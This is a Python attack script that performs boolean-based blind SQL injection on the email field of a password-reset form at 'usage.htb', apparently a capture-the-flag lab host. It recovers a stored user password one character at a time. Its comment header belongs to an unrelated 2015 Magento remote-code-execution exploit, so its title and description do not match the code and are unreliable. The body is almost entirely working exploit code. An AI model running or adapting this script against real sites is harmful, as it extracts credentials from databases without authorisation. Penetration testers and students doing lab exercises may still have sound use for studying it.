#!/usr/bin/python
# Exploit Title: Magento CE < 1.9.0.1 Post Auth RCE 
# Google Dork: "Powered by Magento"
# Date: 08/18/2015
# Exploit Author: @Ebrietas0 || http://ebrietas0.blogspot.com
# Vendor Homepage: http://magento.com/
# Software Link: https://www.magentocommerce.com/download
# Version: 1.9.0.1 and below
# Tested on: Ubuntu 15
# CVE : none

import sys
import mechanize
import math
import time

# config
target = 'http://usage.htb/forget-password'
user_selector = "id = 1" # "email = 'raj@usage.htb'"
field = "password" # 'password'

# Setup the mechanize browser and options
br = mechanize.Browser()
#br.set_proxies({"http": "localhost:8080"})
br.set_handle_robots(False)

pw = ''

delay = 200 # ms

def send_query(q):
    br.open(target)
    br.select_form(action='http://usage.htb/forget-password')
    br['email'] = f"a' OR {q}-- -"
    response = br.submit()

    # if rate limited, sleep then try again
    if response.code == 419:
        time.sleep(1)
        return send_query(q)

    content = response.read().decode('ascii')
    return 'We have e-mailed your password reset link to' in content

print(f"Testing for {user_selector}")

print("Determining length...", end='')
lower, upper = 0, 256
len = 0
while lower != upper:
    len = math.ceil((lower + upper) / 2)

    if send_query(f"EXISTS (SELECT id from users where {user_selector} and length({field}) < {len})"):
        upper = len - 1
    else:
        lower = len

print(len)

for i in range(len):
    lower, upper = 33, 122
    while lower != upper:
        mid = math.ceil((lower + upper) / 2)
        sys.stdout.write('\r' + pw + chr(mid))
        sys.stdout.flush()

        if send_query(f"EXISTS (SELECT id from users where {user_selector} and ascii(substr({field}, {i+1}, 1)) < {mid})"):
            upper = mid - 1
        else:
            lower = mid

    pw = pw + chr(lower)
    sys.stdout.write('\r' + pw)
    sys.stdout.flush()

    time.sleep(delay / 1000)

print(f"\n\n{pw}")

print("Testing {field}...")
if send_query(f"EXISTS (SELECT id from users where {user_selector} and {field} = '{pw}')"):
    print("Success!")
else:
    print("Something went wrong :(")
